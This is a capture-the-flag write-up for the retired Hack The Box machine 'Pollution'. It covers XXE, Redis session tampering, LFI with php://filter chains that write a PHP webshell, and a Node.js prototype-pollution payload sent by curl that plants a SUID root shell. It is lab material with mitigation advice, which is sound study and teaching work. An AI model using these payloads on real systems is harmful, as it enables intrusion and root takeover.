---
machine: Pollution
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, xxe, redis, php-fpm, prototype-pollution, privesc]
---

# Pollution — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A forum token grants admin and reaches an XXE that reads source code. With sessions stored in Redis, access `developers.collect.htb`, where LFI with filter injection yields RCE. PHP-FPM and `victor`'s session allow SSH; the `pollution_api` is vulnerable to prototype pollution and runs as root.

## Recon

```bash
nmap -Pn -sCV -p22,80,6379 <IP>
```

- `22` SSH, `80` nginx and `6379` unauthenticated Redis.
- `ffuf` finds `forum.collect.htb` and `developers.collect.htb`.
- The forum has a Burp ZIP with a token from a post.

## Enumeration

- The token from the Burp history elevates the account to administrator.
- The admin panel has an XML endpoint vulnerable to XXE.
- XXE reads the source code and Redis configuration.

## Foothold

Use XXE to read `/var/www/collect/public/index.php` and sessions. With Redis, change the session role and access `developers.collect.htb`; crack the `.htpasswd`.

```bash
redis-cli -h <IP> keys '*'
redis-cli -h <IP> get 'PHPREDIS_SESSION:<ID>'
```

## Lateral movement

The developer portal has an LFI parameter. Use `php://filter` with conversion chains to write a webshell and run as `www-data`; `victor`'s session and PHP-FPM provide SSH access.

```bash
php-filter-chain-generator '<?php system($_GET[0]); ?>' > chain.txt
```

## Privilege escalation

`pollution_api` is a Node.js API in development that merges JSON without filtering `__proto__`. Pollute `Object.prototype` with a `child_process` option and run a command as root.

```bash
curl -s -X POST 'http://127.0.0.1:3000/' -H 'Content-Type: application/json' --data '{"text":"x","__proto__":{"shell":"/proc/self/exe","argv0":"console.log(require(\"child_process\").execSync(\"cp /bin/bash /tmp/0xdf && chmod 4777 /tmp/0xdf\"))//","NODE_OPTIONS":"--require /proc/self/cmdline"}}'
/tmp/0xdf -p
```

## Evidence

- Forum token and XXE source read.
- Redis session and developers access.
- LFI with filter injection and PHP-FPM.
- Prototype pollution and root shell.

## Lessons learned

- A leaked token in a Burp backup can elevate privileges.
- Redis sessions are manipulable when Redis is exposed.
- Prototype pollution can reach RCE when a library merges JSON unsafely.

## Mitigation and detection

- Do not publish Burp backups or tokens; protect Redis.
- Validate and normalize paths; avoid `php://filter` in includes.
- Reject `__proto__` and `constructor` in JSON; update dependencies.

## References

- [0xdf — Pollution](https://0xdf.gitlab.io/2023/07/01/htb-pollution.html)
- [IppSec — Pollution](https://www.youtube.com/watch?v=dQt5iRFtgAY)
- [Hack The Box — Pollution](https://app.hackthebox.com/machines/pollution)
